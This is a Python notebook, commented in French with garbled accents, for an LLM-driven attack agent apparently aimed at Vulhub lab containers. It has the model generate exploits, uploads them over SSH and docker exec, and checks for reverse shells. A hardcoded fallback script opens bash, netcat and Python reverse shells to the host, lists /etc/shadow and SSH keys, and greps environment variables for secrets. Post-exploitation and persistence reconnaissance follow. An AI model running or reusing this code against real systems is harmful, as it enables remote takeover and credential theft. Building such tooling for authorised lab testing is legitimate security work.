# Enhanced Red Team Agent avec Ex√©cution Distante
# Filename: notebook_07_enhanced_redteam_remote.ipynb

# %% [markdown]
"""
# Agent Red Team Enhanced - Ex√©cution Distante R√©elle

## R√©volution de l'Exploitation :
- ‚úÖ **Ex√©cution SSH distante** : Scripts d'exploit lanc√©s directement sur les containers
- ‚úÖ **Reverse Shell r√©el** : Connexions authentiques via netcat sur machine h√¥te
- ‚úÖ **Adaptation contextuelle** : Exploits g√©n√©r√©s selon l'environnement r√©el d√©tect√©
- ‚úÖ **Validation en temps r√©el** : Tests imm√©diats des payloads sur la cible
- ‚úÖ **Persistence testing** : √âtablissement de backdoors et maintien d'acc√®s
- ‚úÖ **Evidence collection** : Preuves de compromission r√©elles

## Architecture R√©volutionnaire :
Container LLM ‚Üí SSH (100.91.1.1) ‚Üí docker exec ‚Üí Container Vulhub ‚Üí Exploitation R√âELLE

## Workflow Enhanced :
1. **Analyse du rapport Enhanced** : Donn√©es de reconnaissance r√©elle
2. **G√©n√©ration d'exploits adapt√©s** : Scripts personnalis√©s pour l'environnement
3. **Upload SSH** : Transfert des exploits vers le container cible
4. **Ex√©cution distante** : Lancement r√©el des exploits
5. **Listener management** : Reverse shells authentiques
6. **Validation et preuves** : Collection d'artefacts de compromission
"""

# %%
import os
import json
import subprocess
import sys
import time
import base64
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path

# Import du Remote Execution Manager
try:
    from remote_execution_manager import (
        SSHDockerManager, RemoteExploitExecutor,
        SSHConfig, get_ssh_config_interactive,
        select_target_container_interactive
    )
except ImportError:
    print("‚ö† Remote Execution Manager non trouv√©. Assurez-vous qu'il est disponible.")
    sys.exit(1)

# Imports LangChain et Pydantic
from pydantic import BaseModel, Field, validator
from langchain.llms import Ollama
from langchain.embeddings import OllamaEmbeddings
from langchain.vectorstores import Chroma
from langchain.prompts import PromptTemplate
from langchain.chains import LLMChain
from langchain.output_parsers import PydanticOutputParser

print("üî¥ Enhanced Red Team Agent - Remote Execution Ready")

# %%
# Mod√®les Pydantic Enhanced pour l'exploitation distante
class RemoteExploitExecution(BaseModel):
    """R√©sultats d'ex√©cution d'exploit sur container distant"""
    
    script_uploaded: bool = Field(
        description="Script d'exploit upload√© avec succ√®s"
    )
    
    script_path: str = Field(
        description="Chemin du script sur le container cible"
    )
    
    execution_successful: bool = Field(
        description="Ex√©cution du script r√©ussie"
    )
    
    execution_output: str = Field(
        description="Sortie de l'ex√©cution du script",
        default=""
    )
    
    execution_errors: str = Field(
        description="Erreurs d'ex√©cution",
        default=""
    )
    
    reverse_shell_established: bool = Field(
        description="Reverse shell √©tabli avec succ√®s",
        default=False
    )
    
    reverse_shell_details: Dict[str, Any] = Field(
        description="D√©tails de la connexion reverse shell",
        default_factory=dict
    )
    
    compromise_evidence: List[str] = Field(
        description="Preuves de compromission collect√©es",
        default_factory=list
    )

class EnhancedExploitScript(BaseModel):
    """Script d'exploitation enhanced adapt√© √† l'environnement r√©el"""
    
    script_name: str = Field(
        description="Nom du fichier de script"
    )
    
    script_language: str = Field(
        description="Langage du script (python, bash, etc.)"
    )
    
    script_content: str = Field(
        description="Code source complet adapt√© √† l'environnement"
    )
    
    target_payload: str = Field(
        description="Payload principal personnalis√©"
    )
    
    environment_adaptations: List[str] = Field(
        description="Adaptations sp√©cifiques √† l'environnement d√©tect√©",
        default_factory=list
    )
    
    reverse_shell_config: Dict[str, Any] = Field(
        description="Configuration reverse shell pour cet environnement",
        default_factory=dict
    )
    
    dependencies: List[str] = Field(
        description="D√©pendances requises",
        default_factory=list
    )
    
    persistence_mechanisms: List[str] = Field(
        description="M√©canismes de persistance inclus",
        default_factory=list
    )
    
    @validator('script_content')
    def validate_script_content(cls, v):
        if len(v.strip()) < 100:
            raise ValueError("Le script enhanced doit √™tre substantiel")
        return v

class EnhancedExploitationReport(BaseModel):
    """Rapport d'exploitation enhanced avec validation r√©elle"""
    
    exploitation_strategy: str = Field(
        description="Strat√©gie d'exploitation adapt√©e √† l'environnement r√©el"
    )
    
    environment_analysis: Dict[str, Any] = Field(
        description="Analyse de l'environnement cible r√©el",
        default_factory=dict
    )
    
    generated_exploit: EnhancedExploitScript = Field(
        description="Script d'exploitation enhanced g√©n√©r√©"
    )
    
    remote_execution: RemoteExploitExecution = Field(
        description="R√©sultats de l'ex√©cution distante"
    )
    
    real_world_impact: Dict[str, Any] = Field(
        description="Impact r√©el de l'exploitation",
        default_factory=dict
    )
    
    post_exploitation_actions: List[str] = Field(
        description="Actions post-exploitation r√©alis√©es",
        default_factory=list
    )
    
    success_level: str = Field(
        description="Niveau de succ√®s (FULL_REMOTE, PARTIAL_REMOTE, FAILED_REMOTE)"
    )
    
    @validator('success_level')
    def validate_success_level(cls, v):
        allowed = ["FULL_REMOTE", "PARTIAL_REMOTE", "FAILED_REMOTE"]
        if v not in allowed:
            raise ValueError(f"success_level doit √™tre dans {allowed}")
        return v

print("‚úÖ Enhanced Pydantic Models defined")

# %%
# Enhanced Red Team Agent avec capacit√©s d'ex√©cution distante
class EnhancedRedTeamAgent:
    """
    Agent Red Team enhanced avec capacit√©s d'exploitation distante r√©elle
    G√©n√®re ET ex√©cute des exploits directement sur les containers cibles
    """
    
    def __init__(self, model_name: str = "llama2:7b", enhanced_db_path: str = "./enhanced_vple_chroma_db"):
        print("üî¥ Initialisation Enhanced Red Team Agent...")
        
        # Composants LLM
        self.llm = Ollama(model=model_name, temperature=0.3)
        self.embeddings = OllamaEmbeddings(model=model_name)
        
        # Base de donn√©es Enhanced (ATOMIC RED TEAM)
        try:
            self.vectorstore = Chroma(
                persist_directory=enhanced_db_path,
                embedding_function=self.embeddings
            )
            self.retriever = self.vectorstore.as_retriever(search_kwargs={"k": 5})
            print(f"  ‚úÖ Base ATOMIC connect√©e: {enhanced_db_path}")
        except Exception as e:
            print(f"  ‚ö† Erreur base ATOMIC: {e}")
            self.vectorstore = None
            self.retriever = None
        
        # Composants d'ex√©cution distante
        self.ssh_manager = None
        self.exploit_executor = None
        self.target_container = None
        self.host_ip = None
        
        # Parsers Pydantic enhanced
        self.script_parser = PydanticOutputParser(pydantic_object=EnhancedExploitScript)
        self.report_parser = PydanticOutputParser(pydantic_object=EnhancedExploitationReport)
        
        # Configuration des prompts enhanced
        self._setup_enhanced_prompts()
        
        print("  ‚úÖ Enhanced Red Team Agent initialis√©")
    
    def setup_remote_connection(self, ssh_config: SSHConfig = None) -> bool:
        """Configure la connexion distante pour l'exploitation"""
        print("\nüîó Configuration connexion distante Red Team...")
        
        # Configuration SSH
        if ssh_config is None:
            ssh_config = get_ssh_config_interactive()
        
        # Initialisation gestionnaire SSH
        self.ssh_manager = SSHDockerManager(ssh_config)
        
        if not self.ssh_manager.connect():
            print("‚ùå √âchec connexion SSH")
            return False
        
        # Initialisation ex√©cuteur d'exploits
        self.exploit_executor = RemoteExploitExecutor(self.ssh_manager)
        
        # R√©cup√©ration de l'IP h√¥te pour reverse shells
        self.host_ip = ssh_config.host
        
        print("‚úÖ Connexion distante Red Team √©tablie")
        return True
    
    def load_target_from_analysis(self, analysis_report_path: str) -> Dict[str, Any]:
        """Charge les informations de la cible depuis le rapport Enhanced Analyzer"""
        print("üìñ Chargement du rapport d'analyse enhanced...")
        
        try:
            with open(analysis_report_path, 'r') as f:
                analysis_data = json.load(f)
            
            # Extraction des informations cible
            metadata = analysis_data.get('metadata', {})
            enhanced_info = analysis_data.get('enhanced_vulhub_info', {})
            
            target_info = {
                "container_id": metadata.get('target_container'),
                "vulhub_id": metadata.get('vulhub_id'),
                "ports_real": enhanced_info.get('real_vs_documented_ports', {}).get('real', []),
                "attack_type": enhanced_info.get('attack_type', 'Unknown'),
                "service": enhanced_info.get('target_service', 'Unknown'),
                "cve": enhanced_info.get('cve_id'),
                "remote_recon": enhanced_info.get('remote_recon', {}),
                "confidence_score": analysis_data.get('enhanced_analysis_report', {}).get('confidence_score', 0.5)
            }
            
            # Configuration du container cible
            if target_info["container_id"]:
                self.target_container = target_info["container_id"]
                self.exploit_executor.set_target_container(self.target_container)
                print(f"  ‚úÖ Container cible: {self.target_container[:12]}")
            else:
                print("  ‚ö† Container cible non d√©fini dans le rapport")
            
            print(f"  üìä Type d'attaque: {target_info['attack_type']}")
            print(f"  üéØ Service: {target_info['service']}")
            print(f"  üîå Ports r√©els: {target_info['ports_real']}")
            
            return target_info
            
        except Exception as e:
            print(f"‚ùå Erreur chargement rapport: {e}")
            return {}
    
    def _setup_enhanced_prompts(self):
        """Configuration des prompts enhanced pour exploitation distante"""
        
        # Prompt de strat√©gie enhanced
        strategy_template = """Tu es un expert Red Team avec acc√®s aux donn√©es de reconnaissance R√âELLE.

RAPPORT D'ANALYSE ENHANCED (DONN√âES R√âELLES):
{analysis_report}

TECHNIQUES ATOMIC RED TEAM:
{atomic_techniques}

ENVIRONNEMENT CIBLE R√âEL:
- Container ID: {target_container}
- Ports ouverts confirm√©s: {real_ports}
- Services web d√©tect√©s: {web_services}
- Syst√®me d'exploitation: {target_os}

MISSION: D√©velopper une strat√©gie d'exploitation pour un VRAI container Docker.

CONTRAINTES R√âELLES:
1. Le script sera ex√©cut√© VIA SSH sur le container r√©el
2. L'environnement est un container Docker (limites et sp√©cificit√©s)
3. Les reverse shells doivent pointer vers {host_ip}
4. Utiliser les ports r√©ellement ouverts: {real_ports}

RAISONNEMENT STRAT√âGIQUE:
Analyse l'environnement r√©el d√©tect√© et adapte ta strat√©gie aux sp√©cificit√©s du container.
Consid√®re les outils disponibles, les permissions, et les limitations d'un environnement containeris√©.

STRAT√âGIE D'EXPLOITATION ADAPT√âE (300-400 mots):"""

        self.strategy_prompt = PromptTemplate(
            template=strategy_template,
            input_variables=["analysis_report", "atomic_techniques", "target_container", "real_ports", "web_services", "target_os", "host_ip"]
        )
        
        # Prompt de g√©n√©ration d'exploit enhanced
        script_template = """Tu es un d√©veloppeur d'exploits expert sp√©cialis√© dans les containers Docker.

STRAT√âGIE D'EXPLOITATION:
{exploitation_strategy}

ENVIRONNEMENT CIBLE R√âEL:
{target_environment}

CONFIGURATION REVERSE SHELL:
- IP Machine H√¥te: {host_ip}
- Port Listener: {listener_port}
- Environnement: Container Docker

{format_instructions}

CONTRAINTES SP√âCIFIQUES AUX CONTAINERS:
1. Le script s'ex√©cute DANS le container via SSH + docker exec
2. Environnement isol√© avec limitations possibles
3. Outils disponibles limit√©s (v√©rifier avant utilisation)
4. Reverse shell vers la machine H√îTE (pas localhost)
5. Gestion des permissions container

ADAPTATIONS REQUISES:
1. V√©rifier disponibilit√© des outils (curl, wget, nc, etc.)
2. Adapter les payloads √† l'environnement container
3. Pr√©voir des alternatives si certains outils manquent
4. Optimiser pour l'ex√©cution distante

G√âN√âRER UN SCRIPT COMPLET ET FONCTIONNEL:"""

        self.script_prompt = PromptTemplate(
            template=script_template,
            input_variables=["exploitation_strategy", "target_environment", "host_ip", "listener_port"],
            partial_variables={"format_instructions": self.script_parser.get_format_instructions()}
        )
        
        # Cha√Ænes LangChain
        self.strategy_chain = LLMChain(llm=self.llm, prompt=self.strategy_prompt)
        self.script_chain = LLMChain(llm=self.llm, prompt=self.script_prompt)
    
    def analyze_target_environment(self, target_info: Dict[str, Any]) -> str:
        """Analyse l'environnement cible et consulte ATOMIC RED TEAM"""
        print("üß† Analyse de l'environnement cible et consultation ATOMIC...")
        
        # Extraction des donn√©es cl√©s
        attack_type = target_info.get('attack_type', 'Unknown')
        real_ports = target_info.get('ports_real', [])
        
        # Consultation ATOMIC RED TEAM
        atomic_techniques = ""
        if self.retriever:
            try:
                search_query = f"{attack_type} container docker exploitation atomic red team"
                docs = self.retriever.get_relevant_documents(search_query)
                
                if docs:
                    atomic_techniques = "\n".join([doc.page_content[:400] for doc in docs[:3]])
                    print(f"  ‚ö° {len(docs)} techniques ATOMIC trouv√©es")
                else:
                    atomic_techniques = "Aucune technique ATOMIC sp√©cifique trouv√©e"
            except Exception as e:
                print(f"  ‚ö† Erreur consultation ATOMIC: {e}")
                atomic_techniques = "Erreur acc√®s base ATOMIC"
        
        # Pr√©paration des donn√©es d'environnement
        web_services = []
        target_os = "Linux (Container)"
        
        remote_recon = target_info.get('remote_recon', {})
        if remote_recon.get('web_services'):
            web_discoveries = remote_recon['web_services'].get('web_discoveries', {})
            web_services = [f"Port {port}" for port, data in web_discoveries.items() 
                          if data.get('accessible')]
        
        # G√©n√©ration de la strat√©gie
        try:
            strategy = self.strategy_chain.run(
                analysis_report=json.dumps(target_info, indent=2),
                atomic_techniques=atomic_techniques,
                target_container=self.target_container[:12] if self.target_container else "Unknown",
                real_ports=str(real_ports),
                web_services=str(web_services),
                target_os=target_os,
                host_ip=self.host_ip
            )
            
            print("  ‚úÖ Strat√©gie d'exploitation enhanced g√©n√©r√©e")
            return strategy
            
        except Exception as e:
            print(f"  ‚ùå Erreur g√©n√©ration strat√©gie: {e}")
            return f"Exploitation {attack_type} adapt√©e aux containers Docker avec reverse shell vers {self.host_ip}"
    
    def generate_enhanced_exploit(self, strategy: str, target_info: Dict[str, Any]) -> EnhancedExploitScript:
        """G√©n√®re un exploit enhanced adapt√© √† l'environnement r√©el"""
        print("‚öíÔ∏è G√©n√©ration d'exploit enhanced pour container...")
        
        # Configuration du reverse shell
        listener_result = self.exploit_executor.setup_reverse_shell_listener()
        
        if listener_result.get('success'):
            listener_port = listener_result['port']
            print(f"  üéß Listener configur√© sur port {listener_port}")
        else:
            listener_port = 4444
            print(f"  ‚ö† Listener par d√©faut port {listener_port}")
        
        max_attempts = 3
        for attempt in range(max_attempts):
            try:
                # Pr√©paration de l'environnement pour le LLM
                target_environment = {
                    "container_id": self.target_container,
                    "real_ports": target_info.get('ports_real', []),
                    "attack_type": target_info.get('attack_type'),
                    "service": target_info.get('service'),
                    "os": "Linux Container"
                }
                
                # G√©n√©ration avec le LLM
                raw_script = self.script_chain.run(
                    exploitation_strategy=strategy,
                    target_environment=json.dumps(target_environment, indent=2),
                    host_ip=self.host_ip,
                    listener_port=listener_port
                )
                
                # Parsing avec Pydantic
                enhanced_script = self.script_parser.parse(raw_script)
                
                # Enrichissement des configurations
                enhanced_script.reverse_shell_config = {
                    "host_ip": self.host_ip,
                    "port": listener_port,
                    "listener_pid": listener_result.get('pid'),
                    "log_file": listener_result.get('log_file')
                }
                
                print(f"  ‚úÖ Exploit enhanced g√©n√©r√©: {enhanced_script.script_name}")
                print(f"  üîß Langage: {enhanced_script.script_language}")
                print(f"  üåê Reverse shell: {self.host_ip}:{listener_port}")
                
                return enhanced_script
                
            except Exception as e:
                print(f"  ‚ö† Tentative {attempt + 1} √©chou√©e: {e}")
                if attempt == max_attempts - 1:
                    return self._create_enhanced_fallback_script(target_info, listener_port)
                time.sleep(1)
    
    def _create_enhanced_fallback_script(self, target_info: Dict, listener_port: int) -> EnhancedExploitScript:
        """Cr√©e un script enhanced de fallback"""
        print("  üîÑ Cr√©ation d'un exploit de fallback enhanced...")
        
        attack_type = target_info.get('attack_type', 'Web Exploitation')
        real_ports = target_info.get('ports_real', [80, 8080])
        
        # Script adapt√© aux containers
        fallback_script = f"""#!/bin/bash
# Enhanced Exploit Script pour Container Docker
# Target: {target_info.get('service', 'Unknown Service')}
# Attack: {attack_type}

echo "[+] Enhanced Red Team Exploit - Container Environment"
echo "[+] Target Container: $HOSTNAME"
echo "[+] Attack Type: {attack_type}"
echo "[+] Real Ports Detected: {real_ports}"

# Reconnaissance container
echo "[+] === RECONNAISSANCE CONTAINER ==="
echo "[+] User: $(whoami)"
echo "[+] ID: $(id)"
echo "[+] PWD: $(pwd)"
echo "[+] OS Info: $(uname -a)"

# V√©rification outils disponibles
echo "[+] === OUTILS DISPONIBLES ==="
for tool in curl wget nc nmap netstat ss; do
    if command -v $tool >/dev/null 2>&1; then
        echo "[+] $tool: DISPONIBLE"
    else
        echo "[-] $tool: NON DISPONIBLE"
    fi
done

# Test connectivit√© r√©seau
echo "[+] === TEST CONNECTIVIT√â ==="
echo "[+] Test vers machine h√¥te {self.host_ip}..."
if ping -c 1 {self.host_ip} >/dev/null 2>&1; then
    echo "[+] Machine h√¥te accessible"
else
    echo "[-] Machine h√¥te non accessible"
fi

# Tentative reverse shell
echo "[+] === REVERSE SHELL ATTEMPT ==="
echo "[+] Tentative reverse shell vers {self.host_ip}:{listener_port}"

# Multiple reverse shell techniques
echo "[+] Technique 1: Bash TCP"
bash -c 'bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1' &

echo "[+] Technique 2: NC (si disponible)"
if command -v nc >/dev/null 2>&1; then
    nc {self.host_ip} {listener_port} -e /bin/bash &
fi

echo "[+] Technique 3: Python (si disponible)"
if command -v python3 >/dev/null 2>&1; then
    python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{self.host_ip}',{listener_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
" &
fi

# Collection d'informations sensibles
echo "[+] === INFORMATION GATHERING ==="
echo "[+] Fichiers sensibles:"
ls -la /etc/passwd /etc/shadow /root/.ssh/ 2>/dev/null || echo "[-] Acc√®s limit√©"

echo "[+] Variables d'environnement:"
env | grep -E "(PASSWORD|SECRET|KEY|TOKEN)" || echo "[-] Pas de secrets √©vidents"

echo "[+] Processus actifs:"
ps aux | head -10

echo "[+] Connexions r√©seau:"
netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null || echo "[-] Outils r√©seau limit√©s"

echo "[+] === EXPLOITATION TERMIN√âE ==="
echo "[+] V√©rifiez le listener sur {self.host_ip}:{listener_port}"
"""
        
        return EnhancedExploitScript(
            script_name="enhanced_container_exploit.sh",
            script_language="bash",
            script_content=fallback_script,
            target_payload=f"bash -i >& /dev/tcp/{self.host_ip}/{listener_port} 0>&1",
            environment_adaptations=[
                "Adapt√© aux containers Docker",
                "V√©rification outils disponibles",
                "Multiple techniques reverse shell",
                "Reconnaissance container int√©gr√©e"
            ],
            reverse_shell_config={
                "host_ip": self.host_ip,
                "port": listener_port,
                "techniques": ["bash_tcp", "netcat", "python"]
            },
            dependencies=["bash"],
            persistence_mechanisms=["background_processes"]
        )
    
    def execute_enhanced_exploit(self, enhanced_script: EnhancedExploitScript) -> RemoteExploitExecution:
        """Ex√©cute l'exploit enhanced sur le container distant"""
        print("üöÄ Ex√©cution de l'exploit enhanced sur container distant...")
        
        if not self.exploit_executor or not self.target_container:
            return RemoteExploitExecution(
                script_uploaded=False,
                script_path="",
                execution_successful=False,
                execution_output="Container cible non configur√©"
            )
        
        # Upload et ex√©cution du script
        execution_result = self.exploit_executor.upload_and_execute_script(
            enhanced_script.script_content,
            enhanced_script.script_name,
            enhanced_script.script_language
        )
        
        # V√©rification du reverse shell
        reverse_shell_success = False
        reverse_shell_details = {}
        
        if enhanced_script.reverse_shell_config:
            listen_port = enhanced_script.reverse_shell_config.get('port')
            if listen_port:
                print(f"  üéß V√©rification reverse shell port {listen_port}...")
                time.sleep(5)  # Laisser le temps √† la connexion
                
                shell_check = self.exploit_executor.check_reverse_shell_connection(listen_port)
                reverse_shell_success = shell_check.get('has_connection', False)
                reverse_shell_details = shell_check
                
                if reverse_shell_success:
                    print("  ‚úÖ Reverse shell √©tabli avec succ√®s!")
                else:
                    print("  ‚ö† Reverse shell non d√©tect√©")
        
        # Collection de preuves de compromission
        evidence = []
        if execution_result.get('success'):
            evidence.append("Script d'exploitation ex√©cut√© avec succ√®s")
            
            output = execution_result.get('execution_output', '')
            if 'root' in output or 'uid=0' in output:
                evidence.append("Privil√®ges root d√©tect√©s")
            if 'bash' in output and 'tcp' in output:
                evidence.append("Tentative de reverse shell d√©tect√©e")
            if '/etc/passwd' in output:
                evidence.append("Acc√®s aux fichiers syst√®me sensibles")
        
        if reverse_shell_success:
            evidence.append("Reverse shell √©tabli vers machine h√¥te")
        
        return RemoteExploitExecution(
            script_uploaded=execution_result.get('success', False),
            script_path=execution_result.get('script_path', ''),
            execution_successful=execution_result.get('success', False),
            execution_output=execution_result.get('execution_output', ''),
            execution_errors=execution_result.get('execution_errors', ''),
            reverse_shell_established=reverse_shell_success,
            reverse_shell_details=reverse_shell_details,
            compromise_evidence=evidence
        )
    
    def perform_post_exploitation(self) -> List[str]:
        """Effectue des actions post-exploitation sur le container"""
        print("üîç Actions post-exploitation...")
        
        if not self.exploit_executor or not self.target_container:
            return ["Container non accessible pour post-exploitation"]
        
        post_actions = []
        
        # Collection d'informations suppl√©mentaires
        info_commands = [
            ("System Info", "uname -a && cat /etc/os-release"),
            ("User Info", "whoami && id && groups"),
            ("Network Config", "ip addr show 2>/dev/null || ifconfig"),
            ("Process List", "ps aux | head -20"),
            ("Mount Points", "mount | grep -E '(ext|xfs|btrfs)'"),
            ("Environment", "env | grep -E '(PATH|HOME|USER)'")
        ]
        
        for action_name, command in info_commands:
            result = self.exploit_executor.execute_direct_command(
                command, f"Post-exploitation: {action_name}"
            )
            
            if result.get('success'):
                post_actions.append(f"{action_name}: Collect√©")
            else:
                post_actions.append(f"{action_name}: √âchec")
        
        # Tentative de persistance (si appropri√©)
        persistence_commands = [
            ("Crontab Check", "crontab -l 2>/dev/null || echo 'No crontab'"),
            ("SSH Keys", "ls -la ~/.ssh/ 2>/dev/null || echo 'No SSH dir'"),
            ("Writable Dirs", "find /tmp /var/tmp -writable -type d 2>/dev/null | head -5")
        ]
        
        for action_name, command in persistence_commands:
            result = self.exploit_executor.execute_direct_command(command, action_name)
            if result.get('success'):
                post_actions.append(f"Persistance {action_name}: Analys√©")
        
        print(f"  ‚úÖ {len(post_actions)} actions post-exploitation effectu√©es")
        return post_actions
    
    def generate_enhanced_report(self, strategy: str, enhanced_script: EnhancedExploitScript, 
                                execution_result: RemoteExploitExecution, target_info: Dict[str, Any]) -> EnhancedExploitationReport:
        """G√©n√®re le rapport d'exploitation enhanced"""
        print("üìã G√©n√©ration du rapport enhanced...")
        
        # Actions post-exploitation
        post_actions = self.perform_post_exploitation()
        
        # D√©termination du niveau de succ√®s
        if execution_result.reverse_shell_established:
            success_level = "FULL_REMOTE"
        elif execution_result.execution_successful:
            success_level = "PARTIAL_REMOTE"
        else:
            success_level = "FAILED_REMOTE"
        
        # Analyse de l'impact r√©el
        real_impact = {
            "container_compromised": execution_result.execution_successful,
            "reverse_shell_obtained": execution_result.reverse_shell_established,
            "evidence_collected": len(execution_result.compromise_evidence),
            "post_exploitation_actions": len(post_actions),
            "real_world_validation": True
        }
        
        # Analyse de l'environnement
        env_analysis = {
            "target_container": self.target_container[:12] if self.target_container else "Unknown",
            "real_ports_exploited": target_info.get('ports_real', []),
            "attack_type_confirmed": target_info.get('attack_type'),
            "service_compromised": target_info.get('service'),
            "host_ip_targeted": self.host_ip
        }
        
        return EnhancedExploitationReport(
            exploitation_strategy=strategy[:500],
            environment_analysis=env_analysis,
            generated_exploit=enhanced_script,
            remote_execution=execution_result,
            real_world_impact=real_impact,
            post_exploitation_actions=post_actions,
            success_level=success_level
        )
    
    def run_enhanced_exploitation(self, analysis_report_path: str) -> Dict[str, Any]:
        """M√©thode principale d'exploitation enhanced avec ex√©cution distante"""
        print(f"\n{'üî¥'*25}")
        print(f"üî¥ EXPLOITATION ENHANCED AVEC EX√âCUTION DISTANTE")
        print(f"{'üî¥'*25}")
        
        start_time = time.time()
        
        try:
            # √âtape 1: Configuration connexion distante
            print("\nüîó [1/6] Configuration connexion distante...")
            if not self.setup_remote_connection():
                return {"status": "ERROR", "error": "Connexion distante impossible"}
            
            # √âtape 2: Chargement du rapport d'analyse
            print("\nüìñ [2/6] Chargement rapport d'analyse enhanced...")
            target_info = self.load_target_from_analysis(analysis_report_path)
            
            if not target_info or not self.target_container:
                return {"status": "ERROR", "error": "Informations cible invalides"}
            
            # √âtape 3: Analyse de l'environnement et strat√©gie
            print("\nüß† [3/6] Analyse environnement et strat√©gie...")
            strategy = self.analyze_target_environment(target_info)
            
            # √âtape 4: G√©n√©ration d'exploit enhanced
            print("\n‚öíÔ∏è [4/6] G√©n√©ration exploit enhanced...")
            enhanced_script = self.generate_enhanced_exploit(strategy, target_info)
            
            # √âtape 5: Ex√©cution distante de l'exploit
            print("\nüöÄ [5/6] Ex√©cution distante de l'exploit...")
            execution_result = self.execute_enhanced_exploit(enhanced_script)
            
            # √âtape 6: G√©n√©ration du rapport final
            print("\nüìã [6/6] G√©n√©ration rapport final...")
            enhanced_report = self.generate_enhanced_report(
                strategy, enhanced_script, execution_result, target_info
            )
            
            # Nettoyage
            if self.exploit_executor:
                self.exploit_executor.cleanup_exploits()
            
            # Compilation du r√©sultat
            total_time = time.time() - start_time
            
            complete_result = {
                "metadata": {
                    "agent": "EnhancedRedTeamAgent",
                    "version": "Remote_2.0",
                    "timestamp": datetime.now().isoformat(),
                    "execution_time": total_time,
                    "target_container": self.target_container,
                    "host_ip": self.host_ip
                },
                "enhanced_exploitation_report": enhanced_report.dict(),
                "remote_validation": True,
                "status": "SUCCESS"
            }
            
            # Sauvegarde du rapport
            report_file = "enhanced_exploitation_report.json"
            with open(report_file, 'w') as f:
                json.dump(complete_result, f, indent=2)
            
            print(f"\n‚úÖ EXPLOITATION ENHANCED TERMIN√âE")
            print(f"‚è±Ô∏è Temps total: {total_time:.2f} secondes")
            print(f"üéØ Niveau de succ√®s: {enhanced_report.success_level}")
            print(f"üîó Reverse shell: {execution_result.reverse_shell_established}")
            print(f"üìã Preuves: {len(execution_result.compromise_evidence)}")
            print(f"üíæ Rapport sauvegard√©: {report_file}")
            
            return complete_result
            
        except Exception as e:
            print(f"\n‚ùå ERREUR EXPLOITATION ENHANCED: {e}")
            return {
                "metadata": {
                    "agent": "EnhancedRedTeamAgent",
                    "timestamp": datetime.now().isoformat()
                },
                "status": "ERROR",
                "error": str(e)
            }
        
        finally:
            # Nettoyage des connexions
            if self.ssh_manager:
                self.ssh_manager.disconnect()

print("‚úÖ EnhancedRedTeamAgent class defined")

# %%
# Interface de d√©monstration
def demo_enhanced_redteam():
    """D√©monstration de l'Enhanced Red Team avec ex√©cution distante"""
    print("\nüß™ D√âMONSTRATION - ENHANCED RED TEAM REMOTE")
    print("="*60)
    
    # Chargement configuration
    try:
        with open("vple_config.json", "r") as f:
            config = json.load(f)
        model_name = config.get("confirmed_model", "llama2:7b")
        enhanced_db_path = config.get("enhanced_rag_setup", {}).get("vector_db", "./enhanced_vple_chroma_db")
    except:
        model_name = "llama2:7b"
        enhanced_db_path = "./enhanced_vple_chroma_db"
    
    # Initialisation de l'agent enhanced
    red_team = EnhancedRedTeamAgent(
        model_name=model_name,
        enhanced_db_path=enhanced_db_path
    )
    
    # Recherche du rapport d'analyse
    analysis_files = [
        "enhanced_analysis_apache_CVE-2021-41773.json",
        "enhanced_analysis_struts2_s2-001.json",
        "analysis_report.json"
    ]
    
    analysis_file = None
    for file_path in analysis_files:
        if os.path.exists(file_path):
            analysis_file = file_path
            break
    
    if not analysis_file:
        print("‚ùå Aucun rapport d'analyse trouv√©")
        print("   Fichiers recherch√©s:", analysis_files)
        return
    
    print(f"üìñ Utilisation du rapport: {analysis_file}")
    
    # Ex√©cution de l'exploitation enhanced
    result = red_team.run_enhanced_exploitation(analysis_file)
    
    # Affichage des r√©sultats
    if result['status'] == 'SUCCESS':
        exploitation_report = result['enhanced_exploitation_report']
        print(f"\nüéâ EXPLOITATION ENHANCED R√âUSSIE!")
        print(f"   üéØ Succ√®s: {exploitation_report['success_level']}")
        print(f"   üîó Reverse shell: {exploitation_report['remote_execution']['reverse_shell_established']}")
        print(f"   üìã Preuves: {len(exploitation_report['remote_execution']['compromise_evidence'])}")
        print(f"   ‚öôÔ∏è Post-exploitation: {len(exploitation_report['post_exploitation_actions'])}")
        
        if exploitation_report['remote_execution']['compromise_evidence']:
            print(f"\nüö® PREUVES DE COMPROMISSION:")
            for evidence in exploitation_report['remote_execution']['compromise_evidence']:
                print(f"   - {evidence}")
        
    else:
        print(f"\n‚ùå Exploitation √©chou√©e: {result.get('error', 'Erreur inconnue')}")
    
    print(f"\nüéâ D√âMONSTRATION TERMIN√âE")

if __name__ == "__main__":
    demo_enhanced_redteam()

print("\nüî¥ ENHANCED RED TEAM AGENT READY!")
print("Capacit√©s: SSH + Docker + Exploitation r√©elle + Reverse shells + Post-exploitation")
